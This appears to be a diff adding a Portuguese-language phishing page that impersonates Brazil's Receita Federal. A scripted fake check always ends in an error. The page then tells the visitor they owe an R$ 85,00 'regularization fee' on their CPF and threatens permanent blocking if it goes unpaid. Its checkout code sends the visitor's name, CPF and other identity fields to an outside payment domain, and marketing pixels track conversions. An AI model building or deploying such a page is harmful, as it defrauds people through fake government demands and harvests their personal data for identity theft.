@@ -1,0 +1,154 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+  ttq.load('D6ROQ3BC77UA8MCFBSDG');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+
+  <script>
+  window.tikTokPixelId = "69b78d959dcfda60eb53f101";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pendência Receita Federal</title>
+    <script>
+  window.pixelId = "6845ec0d545bd01304237507";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+    <style>
+        body { font-family: 'Arial', sans-serif; margin: 0; padding: 0; background-color: #eef2f3; }
+        .header { background-color: #004080; padding: 20px; display: flex; justify-content: center; align-items: center; }
+        .header img { width: 65%; padding: 0%; margin-bottom: 0%; margin-top: -5%; }
+        .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: calc(100vh - 100px); text-align: center; padding: 20px; background: linear-gradient(135deg, #002776, #0044cc); color: white; }
+        .container h1 { font-size: 28px; margin-bottom: 20px; margin-top: -35%; font-weight: bold; }
+        .loading { font-size: 18px; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; }
+        .loading span { margin-left: 10px; font-weight: bold; }
+        .loading-bar { width: 80%; height: 8px; background-color: #cce5ff; border-radius: 5px; overflow: hidden; margin: 15px 0; position: relative; }
+        .loading-bar div { height: 100%; width: 0; background-color: #ffcc00; animation: loading 6s linear forwards; }
+        @keyframes loading { 0% { width: 0; } 100% { width: 100%; } }
+        .container p { font-size: 18px; margin: 15px 0; }
+        .container .highlight { color: #ffcc00; font-weight: bold; }
+        .action { margin-top: 30px; display: none; }
+        .action button { background-color: #ffcc00; color: #002776; border: none; padding: 15px 25px; font-size: 18px; font-weight: bold; border-radius: 8px; cursor: pointer; transition: all 0.3s ease; }
+        .action button:hover { background-color: #ffd633; }
+        .footer { margin-top: 20px; font-size: 14px; color: #cce5ff; }
+        .footer strong { color: #ffcc00; }
+    </style>
+    <script>
+        localStorage.setItem("upsell", "up5");
+    </script>
+    <script>
+        // Redireciona para o checkout3 do up4 repassando TODOS os parâmetros da URL
+        function checkout(event, valorCentavos) {
+            if (event) event.preventDefault();
+
+            var p    = new URLSearchParams(window.location.search);
+            var dest = new URLSearchParams();
+
+            // Repassa TODOS os parâmetros recebidos (nome, cpf, mae, nascimento, utms, etc.)
+            p.forEach(function(value, key) {
+                if (key !== 'valor') dest.set(key, value);
+            });
+
+            // Garante nome e cpf (fallback localStorage)
+            var nome = dest.get('nome') || dest.get('name') || '';
+            var cpf  = dest.get('cpf')  || dest.get('documento') || '';
+
+            if (!nome || !cpf) {
+                try {
+                    var ls = JSON.parse(localStorage.getItem('urlParams') || '{}');
+                    if (!nome) { nome = ls['nome'] || ls['name'] || ''; if (nome) dest.set('nome', nome); }
+                    if (!cpf)  { cpf  = ls['cpf']  || ls['documento'] || ''; if (cpf) dest.set('documento', cpf.replace(/\D/g,'')); }
+                } catch(e) {}
+            }
+
+            // Garante que cpf está em documento também
+            if (dest.get('cpf') && !dest.get('documento')) dest.set('documento', dest.get('cpf').replace(/\D/g,''));
+            if (dest.get('documento')) dest.set('documento', dest.get('documento').replace(/\D/g,''));
+
+            // Valor desta etapa
+            dest.set('valor', String(valorCentavos));
+
+            var url = 'https://pagamentoambienteseguro.online/checkout3.html?' + dest.toString();
+            console.log('Redirecionando para:', url);
+            window.location.href = url;
+        }
+
+        document.addEventListener("DOMContentLoaded", function () {
+            var container     = document.querySelector(".container");
+            var actionSection = document.querySelector(".action");
+            var loadingBar    = document.querySelector(".loading-bar div");
+            var loadingElements = document.querySelectorAll(".loading, .loading-bar");
+            var step = 0;
+
+            var steps = [
+                "Verificando pagamento...",
+                "Verificando dados...",
+                "Erro encontrado!"
+            ];
+
+            var interval = setInterval(function() {
+                if (step < steps.length) {
+                    container.querySelector("h1").textContent = steps[step];
+                    step++;
+                } else {
+                    clearInterval(interval);
+                    container.querySelector("h1").textContent = "⚠️ Pendência na Receita Federal!";
+                    loadingElements.forEach(function(el) { el.style.display = "none"; });
+                    actionSection.style.display = "block";
+                }
+            }, 2000);
+
+            loadingBar.style.animationPlayState = 'running';
+        });
+    </script>
+</head>
+
+<body>
+    <div class="header">
+        <img src="https://s3.typebot.io/public/workspaces/clpwrgv88001vlh0fl3wduaqz/typebots/clsoykmoc0001o1a8fuuy3j8r/blocks/ymggz8eopp0fj524hfxubuit?v=1735166818525" alt="Logo Receita Federal">
+    </div>
+
+    <div class="container">
+        <h1>⚠️ Verificando...</h1>
+        <div class="loading">
+            <span>Processando informações...</span>
+        </div>
+        <div class="loading-bar">
+            <div style="animation-play-state: running;"></div>
+        </div>
+
+        <div class="action">
+            <p>Identificamos uma pendência relacionada ao seu <span class="highlight">CPF</span>.</p>
+            <p>Para resolver, é necessário efetuar o pagamento da <span class="highlight">Taxa de Regularização</span>.</p>
+            <p>O valor é de <span class="highlight">R$ 85,00</span>. Após o pagamento, sua solicitação será liberada imediatamente!</p>
+
+            <div class="cta">
+                <button onclick="checkout(event, 8500)">REGULARIZAR AGORA</button>
+            </div>
+        </div>
+
+        <div class="footer">
+            ⚠️ <strong>Atenção:</strong> O não pagamento pode causar o bloqueio definitivo do processo.
+        </div>
+    </div>
+
+</body></html>
